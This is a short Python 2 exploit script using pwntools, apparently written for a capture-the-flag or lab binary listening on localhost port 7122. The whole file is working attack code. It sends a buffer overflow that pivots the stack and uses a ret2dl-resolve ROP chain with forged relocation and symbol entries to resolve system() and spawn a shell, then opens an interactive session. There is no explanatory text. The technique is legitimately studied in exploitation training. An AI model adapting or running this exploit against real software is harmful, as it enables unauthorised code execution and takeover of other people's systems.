#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('127.0.0.1', 7122)

buf = 0x0804a060
d = buf + 2048

dynstr = 0x0804823c
dynsym = 0x080481cc
relplt = 0x080482cc

memcpy = 0x08048310
write = 0x08048330
pop3 = 0x08048519
pop2 = 0x0804851a
pop1 = 0x0804851b
plt0 = 0x08048310


rop = flat(
	plt0, d-relplt, 0xbeefcafe, d+36,
)
print 'reloc_arg:', hex(d-relplt)

data = flat(						# d+0
	buf, 0x7|((d+12-dynsym)/16<<8), 0xcafebeef,	# d+12
	d+28-dynstr, 0, 0, 0x12,			# d+28
	'system\x00\x00',				# d+36
	'sh\x00',
)
print 'r_info:', hex((d+12-dynsym)/16<<8 | 0x7)

raw_input('@')

r.send( ('A'*18 + p32(buf+1024+4)).ljust(1024, '\x00') + 
	rop .ljust(1024, '\x00') +
	data.ljust(1024, '\x00')
)

r.interactive()
